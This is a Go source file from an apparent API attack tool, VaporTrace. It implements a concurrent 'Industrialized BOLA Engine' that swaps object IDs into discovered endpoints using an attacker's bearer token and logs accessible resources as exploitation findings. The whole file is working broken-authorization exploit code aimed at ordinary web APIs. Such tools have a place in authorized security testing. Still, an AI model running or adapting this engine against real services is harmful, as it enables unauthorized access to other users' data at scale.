package logic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"regexp"
	"strings"
	"sync"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOLAContext defines the parameters for an ID-swap attack
type BOLAContext struct {
	BaseURL       string
	VictimID      string
	AttackerID    string
	AttackerToken string
}

// ExecuteMassBOLA handles the industrialized execution of BOLA across the pipeline.
// It pulls targets from GlobalDiscovery that have been tagged by the heuristic analyzer.
func ExecuteMassBOLA(concurrency int) {
	pterm.DefaultSection.Println("Phase 9.7: Industrialized BOLA Engine")
	
	GlobalDiscovery.mu.RLock()
	var targets []string
	for path, entry := range GlobalDiscovery.Inventory {
		isTarget := false
		for _, eng := range entry.Engines {
			if eng == "BOLA" {
				isTarget = true
				break
			}
		}
		if isTarget {
			targets = append(targets, path)
		}
	}
	GlobalDiscovery.mu.RUnlock()

	if len(targets) == 0 {
		pterm.Info.Println("No BOLA-vulnerable patterns detected in current map.")
		return
	}

	// Default test IDs for mass probing
	testIDs := []string{"1", "2", "10", "100", "101", "1000", "1337"}

	for _, t := range targets {
		pterm.Info.Printfln("BOLA Probing Resource: %s", t)
		ctx := &BOLAContext{
			BaseURL: CurrentSession.TargetURL + t,
		}
		ctx.MassProbe(testIDs, concurrency)
	}
}

// getResource fetches a resource and returns status and body for comparison.
// Refactored to handle RESTful placeholders like {petId} or {id}.
func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
	u, err := url.Parse(b.BaseURL)
	if err != nil {
		return 0, "", err
	}

	target := u.String()
	
	// FIX: Regex to find Swagger/REST variables in braces
	re := regexp.MustCompile(`\{.*?\}`)
	if re.MatchString(target) {
		// Replace the first occurrence of {variable} with the resourceID
		target = re.ReplaceAllString(target, resourceID)
	} else {
		// Fallback: Append the ID to the path if no placeholder exists
		u.Path = path.Join(u.Path, resourceID)
		target = u.String()
	}

	req, _ := http.NewRequest("GET", target, nil)
	
	// Set auth if provided, otherwise use the global session token
	if token != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	} else if CurrentSession.AttackerToken != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
	}

	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.10 Industrialized)")

	// Execute via the networking gatekeeper (SafeDo)
	resp, err := SafeDo(req, false, "BOLA-ENGINE") 
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

// MassProbe implements the Worker Pool for high-speed ID enumeration
func (b *BOLAContext) MassProbe(idList []string, concurrency int) {
	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()
	idChan := make(chan string, concurrency)
	var wg sync.WaitGroup

	// 1. Initialize Worker Pool
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for id := range idChan {
				instance := *b // Thread-safe local copy of context
				instance.VictimID = id
				instance.ProbeSilent() 
				pb.Increment()
			}
		}()
	}

	// 2. Feed the workers
	for _, id := range idList {
		idChan <- id
	}
	close(idChan)

	// 3. Wait for completion
	wg.Wait()
	pb.Stop()
	pterm.Success.Println("BOLA scan sequence completed.")
}

// ProbeSilent provides optimized execution for mass scanning without UI clutter
func (b *BOLAContext) ProbeSilent() {
	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	code, body, err := b.getResource(b.VictimID, activeToken)
	if err != nil || code != 200 { 
		return 
	}

	// Heuristic analysis: Ignore false positives (e.g., custom error pages with 200 OK)
	lowerBody := strings.ToLower(body)
	if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || len(body) < 2 { 
		return 
	}

	pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgYellow, pterm.FgBlack)}
	pterm.Warning.Printfln("BOLA Potential: Resource ID %s accessible at %s", b.VictimID, b.BaseURL)

	// Persistence: Log the hit to the database
	db.LogQueue <- db.Finding{
		Phase:   "PHASE III: EXPLOITATION",
		Target:  b.BaseURL,
		Details: fmt.Sprintf("BOLA ID Swap Success: ID %s returned 200 OK", b.VictimID),
		Status:  "VULNERABLE",
	}
}